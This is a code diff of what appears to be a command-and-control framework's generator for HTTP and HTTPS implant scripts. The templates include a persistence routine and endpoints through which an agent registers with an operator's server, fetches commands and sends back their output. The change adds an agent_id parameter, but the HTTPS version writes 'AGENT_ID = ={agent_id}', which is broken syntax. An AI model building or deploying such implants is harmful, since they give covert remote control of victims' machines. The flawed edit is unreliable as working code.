@@ -163,7 +163,7 @@ if __name__ == "__main__":
 
 """
 
-def http_agent_template(lhost, lport, persistence, userAgent, sleepTimer):
+def http_agent_template(lhost, lport, persistence, userAgent, sleepTimer,agent_id):
     if persistence==True:
         val1=f'''def ensure_persistence():
     try:
@@ -200,7 +200,7 @@ headers = {{
 }}
 
 SERVER_URL = 'http://{lhost}:{lport}'
-AGENT_ID = str(uuid.uuid4())
+AGENT_ID = {agent_id}
 REGISTER_ENDPOINT = f'{{SERVER_URL}}/register'
 COMMAND_ENDPOINT = f'{{SERVER_URL}}/get_command'
 OUTPUT_ENDPOINT = f'{{SERVER_URL}}/send_output'
@@ -331,7 +331,7 @@ if __name__ == "__main__":
 """
     return template
 
-def https_agent_template(lhost, lport, persistence, userAgent, sleepTimer):
+def https_agent_template(lhost, lport, persistence, userAgent, sleepTimer,agent_id):
     if persistence==True:
         val1=f'''def ensure_persistence():
     try:
@@ -368,7 +368,7 @@ headers = {{
 }}
 
 SERVER_URL = 'https://{lhost}:{lport}'
-AGENT_ID = str(uuid.uuid4())
+AGENT_ID = ={agent_id}
 REGISTER_ENDPOINT = f'{{SERVER_URL}}/register'
 COMMAND_ENDPOINT = f'{{SERVER_URL}}/get_command'
 OUTPUT_ENDPOINT = f'{{SERVER_URL}}/send_output'
